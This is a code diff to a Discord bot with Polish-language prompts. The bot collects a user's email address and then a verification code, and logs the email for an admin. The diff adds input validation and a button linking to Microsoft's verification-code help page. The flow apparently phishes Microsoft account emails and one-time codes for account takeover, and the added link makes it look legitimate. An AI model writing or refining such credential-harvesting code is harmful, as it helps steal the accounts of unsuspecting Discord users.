@@ -156,7 +156,17 @@ client.on('interactionCreate', async (interaction) => {
     // 3. Modal Submission Handling
     if (interaction.isModalSubmit()) {
         if (interaction.customId === 'modal_email') {
-            const email = interaction.fields.getTextInputValue('input_email');
+            const email = interaction.fields.getTextInputValue('input_email').trim();
+            
+            // Prosta walidacja adresu e-mail
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailRegex.test(email)) {
+                return interaction.reply({ 
+                    content: '❌ **Błąd:** Podaj poprawny adres e-mail (np. nazwa@outlook.com).', 
+                    ephemeral: true 
+                });
+            }
+
             pendingVerifications.set(interaction.user.id, { email });
 
             // Log email for admin
@@ -187,14 +197,27 @@ client.on('interactionCreate', async (interaction) => {
                     .setCustomId('btn_step_code')
                     .setLabel('Wprowadź Kod')
                     .setEmoji('🔑')
-                    .setStyle(ButtonStyle.Success)
+                    .setStyle(ButtonStyle.Success),
+                new ButtonBuilder()
+                    .setLabel('Nie otrzymałem kodu')
+                    .setURL('https://support.microsoft.com/pl-pl/account-billing/rozwi%C4%85zywanie-problem%C3%B3w-z-kodem-weryfikacyjnym-firmy-microsoft-409090c4-92b5-42b9-8ae6-bcc97e62fc48')
+                    .setStyle(ButtonStyle.Link)
             );
 
             await interaction.reply({ embeds: [nextStepEmbed], components: [row], ephemeral: true });
         }
 
         if (interaction.customId === 'modal_code') {
-            const code = interaction.fields.getTextInputValue('input_code');
+            const code = interaction.fields.getTextInputValue('input_code').trim();
+            
+            // Prosta walidacja kodu (minimum 4 znaki)
+            if (code.length < 4) {
+                return interaction.reply({ 
+                    content: '❌ **Błąd:** Kod weryfikacyjny jest za krótki. Sprawdź go i spróbuj ponownie.', 
+                    ephemeral: true 
+                });
+            }
+
             const data = pendingVerifications.get(interaction.user.id);
             const email = data ? data.email : "Nieznany";
 
